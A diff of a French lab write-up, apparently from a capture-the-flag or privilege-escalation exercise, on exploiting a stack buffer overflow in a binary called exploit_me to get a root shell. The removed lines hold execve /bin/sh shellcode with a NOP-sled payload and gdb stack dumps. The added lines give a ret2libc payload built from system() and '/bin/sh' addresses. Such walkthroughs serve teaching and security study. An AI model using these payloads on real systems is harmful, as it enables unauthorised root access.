@@ -555,7 +555,7 @@ Cette boucle suivante réorganise les nœuds dans une liste chaînée pour que c
     } while (iVar4 < 6);
     piVar1[2] = 0;
 
-La dernière boucle do...while parcourt la liste chaînée pour vérifier si les éléments sont triés par ordre croissant.
+La dernière boucle do...while parcourt la liste chaînée pour vérifier si les éléments sont triés par ordre decroissant.
 Si la vérification échoue, la fonction appelle explode_bomb
 
     iVar4 = 0;
@@ -644,45 +644,79 @@ Pour réussir cette attaque, nous avons d'abord désactivé l'ASLR (Address Spac
 
 Si la réponse est `0`, cela signifie que l'ASLR est désactivé.
 
-Pour executer un shell, nous allons utiliser un programme ecrit shellcode et qui a une taille de 45 octets.
+Ensuite, nous avons généré une chaîne de caractères de 140 caractères avec la syntaxe Python : 
 
-    \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
+    python -c 'print "0" * 140'
 
-Sachant que le buffer est de 140 avec un depassement de +1 pour tomber sur l'adresse de retour ecrit dans EIP.
-Le but ici va etre d'ecraser le registre EIP (responsable du retour d'instruction) avec une des adresse de la stack qui contient la chaine d'instruction '\x90\x90\x90...' que l'on injectera avant le shellcode /bin/sh.
-L'instruction shellcode '\x90' est utilise pour passer a l'adresse suivante dans la stack.
-On peut alors ecrire 95 octets d'instructions '\x90' + le shellcode de 45 octets pour faire 140 octets de payload
+Cette chaîne de caractères serait utilisée pour provoquer un débordement de tampon.
 
-    python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "[adresse EIP a remplacer par une des adresse de la stack contenant l'instruction '\x90']"'
+L'objectif principal de cette attaque par débordement de tampon est d'obtenir un accès au terminal en tant qu'utilisateur "root".
 
-Cela va nous permettre de faire retourner le programme sur une instruction '\x90' qui va defiler jusqu'a tomber sur le shellcode /bin/sh et l'executer.
-On execute le programme dans gdb et on met un breakpoint juste apres le strcpy pour voir l'etat de la stack :
+Pour atteindre cet objectif, nous avons cherché à exécuter "/bin/sh" en utilisant la commande "system" qui permet de faire des appels systemes. Pour ce faire, nous avons construit une structure de paramètres : [buffer de débordement] [adresse de "system()"] [adresse de retour] [adresse de "/bin/sh"].
 
-    (gdb) b *main+56
+Pour obtenir l'adresse de "system", nous avons utilisé GDB en plaçant un point d'arrêt sur "main", en lançant le programme et en affichant la valeur de "system".
 
-    (gdb) r $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "AAAA"')
+    gdb exploit_me
+    b main
+    r
+    p system
 
-    Breakpoint 1, 0x0804842c in main ()
+On recupere l'adresse de system : 
 
-    (gdb) x/100x $esp
-    0xbffff630:	0xbffff640	0xbffff899	0x00000001	0xb7ec3c49
-    0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090 <===== Debut du buffer avec les instructions '\x90'
-    0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
-    0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
-    0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090 <===== Adresse choisit 0xbffff670
-    0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
-    0xbffff690:	0x90909090	0x90909090	0x90909090	0xeb909090 <===== Debut du shellcode executant /bin/sh
-    0xbffff6a0:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
-    0xbffff6b0:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
-    0xbffff6c0:	0xffffdce8	0x69622fff	0x68732f6e	0x41414141 <===== Registre EIP (41414141 pour AAAA injecte en argument)
+    0xb7e6b060
 
-On choisit l'adresse 0xbffff670 de la stack pour la mettre dans le registre EIP.
+Nous avons également trouvé l'adresse de "/bin/sh" en utilisant la commande "find" :
 
-    \x70\xf6\xff\xbf
+    find __libc_start_main,+99999999,"/bin/sh"
+    0xb7f8cc58
 
-Enfin, nous avons exécuté la commande finale suivante :
+ou en inspectant les plages d'adresses avec "info proc map" dans GDB :
 
-    ./exploit_me $(python -c 'print "\x90" * 95 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x70\xf6\xff\xbf"')
+    (gdb) info proc map
+
+    Mapped address spaces:
+
+
+	Start Addr   End Addr       Size     Offset objfile
+	0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+	0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+	0xb7e2b000 0xb7e2c000     0x1000        0x0 
+	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+	0xb7fd2000 0xb7fd5000     0x3000        0x0 
+	0xb7fdb000 0xb7fdd000     0x2000        0x0 
+	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+On cible un interval d'adresse au niveau de la libc pour chercher /bin/sh */
+
+    ==> 0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+
+    (gdb) find 0xb7fcf000, 0x1a3000,"/bin/sh"
+    0xb7f8cc58
+
+Il faut transformer ces adresses en écriture de shellcode
+
+Adresse de "system" :
+
+    0xb7e6b060 => \x60\xb0\xe6\xb7
+
+Adresse de "/bin/sh" :
+
+    0xb7f8cc58 => \x58\xcc\xf8\xb7
+
+
+Voici le shellcode à intégrer en argument après le buffer overflow :
+
+    "\x60\xb0\xe6\xb7" + "0000" + "\x58\xcc\xf8\xb7"
+
+"System" permet de faire appel à des fonctions système. Il attend en arguments dans la pile l'adresse de retour de la fonction ainsi que l'adresse de la fonction elle-même.
+
+D'où le shellcode respectant l'ordre [system] + [adresse de retour] + [adresse /bin/sh]. Dans notre cas, il n'est pas important de donner l'adresse de retour de la fonction, cela entrainera seulement un segmentation fault au depart de notre shell "root".
 ### Élévation des privilèges
 
 Cette commande a ouvert un shell en tant qu'utilisateur "root". En utilisant la commande "whoami", nous avons confirmé que nous avions obtenu les privilèges "root".
